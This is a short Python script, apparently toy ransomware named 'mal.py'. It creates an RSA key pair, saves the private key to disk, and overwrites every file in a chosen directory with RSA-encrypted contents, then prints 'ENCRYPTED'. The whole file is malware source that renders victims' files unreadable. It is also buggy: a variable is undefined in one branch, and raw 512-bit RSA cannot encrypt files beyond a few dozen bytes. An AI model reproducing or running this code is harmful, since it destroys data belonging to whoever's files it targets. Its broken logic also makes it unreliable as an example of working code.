import rsa
import os
import sys

if int(len(sys.argv))>1:
	args=str(sys.argv[1])

publicKey, privateKey = rsa.newkeys(512)

#write my key
with open("seckey.pem","wb") as mykey:
	mykey.write(privateKey.save_pkcs1())


files=[]

if int(len(sys.argv))>1 and args=='current':
	for i in os.listdir():
		if i=='mal.py' or i=='seckey.pem' or i=='dec.py':
			continue
		if os.path.isfile(i):
			files.append(i)
else:
	paths=input("Enter target directory path address :")
	if not paths[(len(paths)-1)]=='/':
		paths=paths+'/'
	for i in os.listdir(paths):
		if i=='mal.py' or i=='seckey.pem' or i=='dec.py':
			continue
		if os.path.isfile(paths+str(i)):
			files.append(i)

if files:
	for i in files:
		with open(paths+str(i),"r") as targets:
			contents=targets.read()
		with open(paths+str(i),"wb") as target:
			target.write(rsa.encrypt(contents.encode(),publicKey))
	print("....................ENCRYPTED......................")

else:
	print("#######----No Files")
